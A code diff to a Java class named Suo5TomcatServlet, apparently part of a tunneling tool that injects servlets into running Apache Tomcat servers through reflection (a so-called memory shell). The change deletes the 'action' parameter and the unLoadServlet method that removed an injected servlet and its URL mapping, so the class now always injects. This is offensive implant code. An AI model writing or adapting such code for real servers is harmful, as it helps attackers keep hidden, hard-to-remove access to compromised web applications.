@@ -28,7 +28,6 @@ public final class Suo5TomcatServlet extends ClassLoader implements Servlet, Run
     private String wrapperName;
     private String urlPattern;
     private String userAgent;
-    private String action;
 
     public static HashMap addrs = collectAddr();
     public static HashMap ctx = new HashMap();
@@ -533,7 +532,6 @@ public final class Suo5TomcatServlet extends ClassLoader implements Servlet, Run
             this.urlPattern = getp("urlPattern");
             this.wrapperName = getp("wrapperName");
             this.userAgent = getp("userAgent");
-            this.action = getp("action");
             return true;
         } catch (Exception var3) {
             return false;
@@ -541,11 +539,7 @@ public final class Suo5TomcatServlet extends ClassLoader implements Servlet, Run
     }
 
     public String toString() {
-        if (this.action.equals("inject")) {
-            this.parameterMap.put("result", this.addServlet().getBytes());
-        } else {
-            this.parameterMap.put("result", this.unLoadServlet().getBytes());
-        }
+        this.parameterMap.put("result", this.addServlet().getBytes());
         this.parameterMap = null;
         return "";
     }
@@ -585,33 +579,6 @@ public final class Suo5TomcatServlet extends ClassLoader implements Servlet, Run
             return var10.getMessage();
         }
         return "ok, wrapperName: " + wrapperName;
-    }
-
-    public String unLoadServlet() {
-        if (this.wrapperName != null && this.wrapperName.length() > 0 && this.urlPattern != null && this.urlPattern.length() > 0) {
-            try {
-                Object o = getFieldValue(this.servletContext, "context");
-                Field field = o.getClass().getDeclaredField("context");
-                field.setAccessible(true);
-                Object standardContext = getFieldValue(o, "context");
-                Object wrapper = this.invoke(standardContext, "findChild", this.wrapperName);
-                Class containerClass = Class.forName("org.apache.catalina.Container", false, standardContext.getClass().getClassLoader());
-                if (wrapper != null) {
-                    standardContext.getClass().getDeclaredMethod("removeChild", containerClass).invoke(standardContext, wrapper);
-                    this.invoke(standardContext, "removeServletMapping", this.urlPattern);
-                    if (this.getMethodByClass(wrapper.getClass(), "setServlet", Servlet.class) == null) {
-                        this.transform(standardContext, this.urlPattern);
-                    }
-                    return "ok";
-                } else {
-                    return "not find wrapper";
-                }
-            } catch (Exception var8) {
-                return var8.getMessage();
-            }
-        } else {
-            return "wrapperName or urlPattern is Null";
-        }
     }
 
     public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
